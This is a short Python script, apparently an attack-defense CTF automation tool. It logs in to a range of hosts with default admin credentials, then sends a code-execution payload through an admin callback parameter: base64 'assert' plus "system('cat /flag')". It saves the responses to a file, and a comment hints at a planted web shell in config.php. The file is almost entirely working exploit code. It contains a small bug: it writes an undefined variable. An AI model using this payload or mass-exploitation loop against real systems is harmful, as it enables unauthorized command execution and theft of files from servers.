#coding=utf-8
import requests
import re

shell_addr="/index.php?c=login"
payload =  {'username':'admin','password':'admin'}

iplist = []
for i in range(0,10):
    iplist.append("http://39.100.119.37:40"+str(i)+"80")
print(iplist)
for i in range(10,30):
    iplist.append("http://39.100.119.37:4"+str(i)+"80")
print(iplist)



#密码cmd-路径是config点php
flag_file=open('flag.txt','w')
for ip in iplist:
    s = requests.Session()
    url=ip+shell_addr
    #print(url)
    try:
        #flag.write(ip+"\n")
        res=s.post(url,payload,timeout=2)
        res=s.get(ip+"/index.php?c=admin&a=callback_in&e=YXNzZXJ0&content=system(%27cat%20/flag%27);",timeout=2)
        #print(res.text)
        if res.status_code == requests.codes.ok:
            print(res.text)
            flag_file.write(text+"\n")
        else:
            pass
    except Exception as e:
        #print(url+" connect shell fail")
        pass
flag_file.close()